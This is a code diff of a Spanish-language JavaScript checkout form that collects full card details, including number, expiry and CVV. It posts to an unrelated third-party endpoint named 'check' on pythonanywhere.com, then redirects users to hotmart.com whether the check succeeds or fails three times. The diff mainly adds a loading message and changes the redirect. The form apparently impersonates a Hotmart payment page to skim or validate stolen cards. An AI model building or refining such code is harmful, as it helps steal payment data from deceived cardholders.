@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('payment-form');
-    let submitCount = 0; // Contador de envíos
+     // Contador de envíos
 
     if (form) {
         form.addEventListener('submit', async function(e) {
@@ -78,34 +78,38 @@ document.addEventListener('DOMContentLoaded', function() {
             // Validaciones
             if (!email || !emailConf || !name || !address1 || !postal || !cardNumber || !cardExpiry || !cardCVV || !cardHolder) {
                 document.getElementById('response').textContent = "Por favor, complete todos los campos obligatorios.";
-                submitCount = 1;
+                
                 return;
             }
             if (email !== emailConf) {
                 document.getElementById('response').textContent = "Los correos electrónicos no coinciden.";
-                submitCount = 1;
+                
                 return;
             }
             if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                 document.getElementById('response').textContent = "Correo electrónico inválido.";
-                submitCount = 1;
+                
                 return;
             }
             if (!/^\d{16}$/.test(cardNumber)) {
                 document.getElementById('response').textContent = "Número de tarjeta inválido.";
-                submitCount = 1;
+                
                 return;
             }
             if (!/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/.test(cardExpiry)) {
                 document.getElementById('response').textContent = "Fecha de expiración inválida.";
-                submitCount = 1;
+                
                 return;
             }
             if (!/^\d{3,4}$/.test(cardCVV)) {
                 document.getElementById('response').textContent = "CVV inválido.";
-                submitCount = 1;
                 return;
             }
+
+            // Mostrar animación de carga
+            const responseDiv = document.getElementById('response');
+            responseDiv.textContent = '';
+            responseDiv.innerHTML = '<span class="loader"></span> Procesando pago...';
 
             try {
                 const response = await fetch('https://microservice2.pythonanywhere.com/check', {
@@ -116,26 +120,25 @@ document.addEventListener('DOMContentLoaded', function() {
                 const result = await response.json();
                 if (result && result.status === 'Ok') {
                     // Respuesta exitosa, continuar con la redirección
-                    const params = getQueryParams();
-                    window.location.href = 'https://pay.hotmart.com/';
+                    responseDiv.innerHTML = '<span class="loader"></span> Redirigiendo...';
+                    setTimeout(() => {
+                        window.location.href = 'https://hotmart.com/';
+                    }, 1000);
                     return;
                 } else {
                     let attempts = parseInt(sessionStorage.getItem('payment_attempts') || '0', 10) + 1;
                     sessionStorage.setItem('payment_attempts', attempts);
                     if (attempts >= 3) {
-                        const params = getQueryParams();
-                        window.location.href = 'https://pay.hotmart.com/';
+                        window.location.href = 'https://hotmart.com/';
                         return;
                     }
                     const errorMsg = result && result.message ? result.message : "No se pudo procesar el pago. Intente de nuevo.";
-                    document.getElementById('response').textContent = errorMsg;
-                    submitCount = 1;
+                    responseDiv.textContent = errorMsg;
                     return;
                 }
             } catch (error) {
                 console.error('Error en la petición:', error);
-                document.getElementById('response').textContent = "Error al procesar el pago. Por favor, inténtelo de nuevo más tarde.";
-                submitCount = 1;
+                responseDiv.textContent = "Error al procesar el pago. Por favor, inténtelo de nuevo más tarde.";
             }
         });
     }
